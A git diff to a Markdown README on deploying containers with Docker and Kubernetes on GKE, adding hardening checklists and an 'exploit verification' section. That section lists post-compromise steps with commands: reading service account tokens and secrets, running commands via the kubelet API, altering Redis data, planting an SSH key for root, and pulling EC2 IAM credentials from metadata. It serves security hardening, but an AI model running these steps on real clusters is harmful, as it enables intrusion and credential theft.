@@ -820,7 +820,7 @@ docker inspect reqaddr-image
 docker run -p 8088:8088 reqaddr-image
 ```
 
-Set up a project folder on dockerhub, and use the same project name in GKE.
+Set up a project folder on Dockerhub, and use the same project name in GKE.
 Push Docker image to Google Container Registry.
 ```sh
 docker login --username=dockerusername
@@ -916,7 +916,7 @@ kubectl get services | grep url-addr # verify that public IP assigned
 kubectl describe services url-addr
 kubectl logs url-addr-*podID*
 curl -w http://34.x.y.z:8088/addr
-  $ 363120899/1 # (example-every run will produced different address range)
+  $ 363120899/1 # (example-every run will produce different address range)
 ```
 
 Deploy URL shortener, and assign a random public IP address (GCP charges a small fee for reserving a static IP).
@@ -949,40 +949,146 @@ Two of the most common problems are
   (a) having the wrong container image specified, and
   (b) trying to use private images without providing registry credentials.
 
-[Debugging document for Services](http://kubernetes.io/docs/user-guide/debugging-services/)
+[Debugging Kubernetes services](http://kubernetes.io/docs/user-guide/debugging-services/)
 
 [Debugging load balancer](https://stackoverflow.com/questions/35833018/how-can-i-debug-why-a-kubernetes-load-balancer-service-isnt-responding-on-a-por/36407959)
 ```
 kubectl logs <pod name>
-kubectl describe pod <pod name> # SSH to pod and run Docker
+kubectl describe pod <pod name> # SSH to pod
 ```
+
 
 ## Kubernetes Orchestration
 Kubernetes [orchestration functions](https://kubernetes.io/docs/concepts/workloads/controllers/deployment/) include
 creating a deployment, updating the state of pods, rolling back to an earlier revision, scaling up deployment,
 monitoring deployment rollout, and cleaning up unneeded ReplicaSets.
 
-### Monitoring Kubernetes
+
+## Kubernetes Operations
+Continuous integration/continuous delivery has improved the ability of large organizations to roll out software reliably,
+and roll-back to earlier releases when a problem occurs.
+
+The same CI/CD methodology should be used for deploying infrastructure. Every deployment should be tested to the maximum extent possible
+before being rolled out. Using Git to manage infrastructure configuration helps the development team release software at scale using
+tools they are familiar with, a process that WeaveWorks refers to as [GitOps](https://www.weave.works/).
+
+
+## Monitoring Kubernetes
 Kubernetes offers a powerful orchestration capability, but lacks many features needed to run cloud deployments in production.
 Many competing software services have been quickly built up to provide these features, leading to a fragmented software ecosystem.
 
 There are many monitoring solutions to help managed Kubernetes deployments, including [Kube-prometheus](https://github.com/coreos/kube-prometheus)
 which uses Prometheus to monitor Kubernetes applications, and Heptio [Sonobuoy](https://github.com/heptio/sonobuoy).
 
+
 ## Kubernetes Cluster Security
-By default, a user with a [shell in a container] can possible
-  1. Retrieve source code and credentials
-  2. Elevate privilieges to access all workloads
-  3. Get root access to the cluster nodes
-  4. Access other cloud systems and data
+Many of the Kubernetes installation defaults are not suffiently secure. CIS operating specific benchmarks
+are not aware of the Kubernetes workload. By default, a user with a 
+[shell in a container](https://www.youtube.com/watch?v=vTgQLzeBfRU) can possibly:
+  Retrieve source code and credentials
+  Elevate privilieges to access all workloads
+  Get root access to the cluster nodes
+  Access other cloud systems and data
   
+The low-hanging fruit to add additional security hardening with includes limiting privilege escalation, logging, 
+role-based access control (RBAC), container image safety, and network isolation.
+
+
 ### Securing Docker Containers
+A Docker [security checklist](https://www.sans.org/reading-room/whitepapers/auditing/checklist-audit-docker-containers-37437) (among many other items) includes:
+  Restrict `docker image pull`.
+  Enable `DOCKER_CONTENT_TRUST` environment variable, so only signed images can be pulled.
+  Run only one process in a container.
+  Never run a process as root in a container.
+  Never store data or credentials in a container.
+  Rotate and expire old	keys.
+  Verify third-party container repositories.
+  Use tool like `docker-security-scanning`.
 
 ### Securing Cloud Infrastructure
 Cloud infrastructure needs to be secured, starting with 
-  [securing Linux machines](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/pdf/security_guide/Red_Hat_Enterprise_Linux-6-Security_Guide-en-US.pdf),
-  using private IP addresses on a private subnet, firewall ports that need to be exposed, and running a bastion host for any [SSH access](https://dev.gentoo.org/~swift/docs/security_benchmarks/openssh.html)
-    to Kubernetes nodes.
+[securing Linux machines](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/pdf/security_guide/Red_Hat_Enterprise_Linux-6-Security_Guide-en-US.pdf),
+  using private IP addresses on a private subnet
+  firewall ports that need to be exposed
+  run a bastion host if [SSH access](https://dev.gentoo.org/~swift/docs/security_benchmarks/openssh.html) is needed.
 
 ### Securing Kubernetes
-[Kube-bench] will [eliminate 95%](https://github.com/freach/kubernetes-security-best-practice) of Kubernetes confiugration flaws.
+[Kube-bench] will [eliminate 95%](https://github.com/freach/kubernetes-security-best-practice) of Kubernetes confiugration flaws. Other steps include:
+  disable the profiling API endpoint by setting `--profiling=false`.
+  adding `--admission-control=...,AlwaysPullImages` plugin
+  denying priveldge escalation `--admission-control=...,DenyEscalatingExec`
+  enabling the pod security policy `--admission-control=...,PodSecurityPolicy`
+  restricting access to the `kube-apiserver`
+  ...and many others
+
+### AWS-Specific Steps
+[AWS-specific](https://github.com/freach/kubernetes-security-best-practice/blob/master/AWS.md) steps include:
+  checking AWS Metdata API access from within a Pod, and the `/user-data` endpoint
+  using kube2iam as a proxy between Pods and the AWS Metdata API
+
+### GKE-Specific Steps
+Steps to [secure a GKE installation](https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster) include:
+  Disable Kubernetes dashboard
+  Disable attribute-based access control (ABAC), use role-based access control
+  Restrict traffic among pods with a network policy
+  Use least privilege service accounts
+  Restrict client authentication methods
+  Protect node metadata
+  Automatically upgrade your nodes
+  Restrict pod permissions with a pod security policy
+  Restrict cluster iscovery RBAC permissions
+  
+### Kubernetes Exploit Verification
+Work on Kubernetes security is ongoing to close these vulnerabities in the default installation, which
+could eliminate the need for manual hardeining.
+
+Kubernetes still should be routinely checked for exploit vulnerabilities. [Vulnerability tests](https://www.youtube.com/watch?v=vTgQLzeBfRU) include:
+  Get pod access, internet access; install tools (`nc`, `nmap`, `kubectl`)
+    -Map the system; docker/cAdvisor, heapster.kube-system/metrics, kubelet /metrics
+  List endpoints
+    -find node IPs, list all pods on nodes - pod names, namespaces they are in...
+	-`kubectl get nodes -o wide`
+	-`curl -sk IPnode/metrics | less`
+  Get ServiceAccount token; get secrets, escalate to cluster admin
+    -verify token
+	  -`ls -al /var/run/secrets/kubernetes.io/serviceaccount`
+	-install kubectl
+	-install iputils-ping, nmap, vim, python-pip, groff-base, tcpdump, curl; pip install awscli
+	-use kubectl with high privilege
+	  -`kubectl get pods --all-namespaces`
+	  -`kubectl get secrets --all-namespaces | grep default`
+  Access Kubernetes dashboard
+    - curl service DNS
+	  - `curl -s http://kubernetes-dashboard.kube-system`
+	- remote forward port via SSH
+  Access internal apps
+	-`kubectl get svc`
+	-`nmap -n -T5 -p 639 -Pn 100.65.29.230` # verify host is up and responding
+	-`apt install redis-tools`             # Redis tools
+	-`redis-cli -h 100.65.29.230`          # connect to database
+	  - `keys *`                          # dump keys
+	  -  `set "key" newval`                # modify value
+  Access Kubelete API
+    -exec into containers, ask for logs
+    -`curl -sk https://...:10250/runningpods/ > allpods` # from read/write port; dump json to file
+	# `run`=command; `default`=namespace; `cmd=ls`=list directory
+	-`curl -sk https://...:10250/run/default/app_folder -d "cmd=ls -al /"` # from read/write port; dump json to file
+    # repeat this `curl` sequence down the directory tree to `/app`, get source code for interesting apps
+  Access Etcd Service directly
+    -most installations don't expose the main Etcd service, but some install a separate instance for other apps or network policies
+  Obtain root on underlying node
+    -after getting access to the node, want to escalate priviledge to root access
+	-get node name & external IP address
+	-exec into it; now on host as root
+	-add own SSH key
+	-back out-
+	-SSH directly in as root
+  Access cloud provider metadata API directly
+    -get kubeadm join tokens
+  EC2 metadata worker IAM credentials
+    -get keys (valid for a couple of hours)
+	-`curl -s IPaddr/latest/meta-data/iam/security-credentials/kubernetes-worker-iam-policy` # (valid for a couple of hours)
+	-export
+	-describe `user-data` on entire AWS account (not just Kubernetes)
+  EC2 metadata master IAM credentials
+    -master pods have access to EC2* (any EC2 command can be executed)
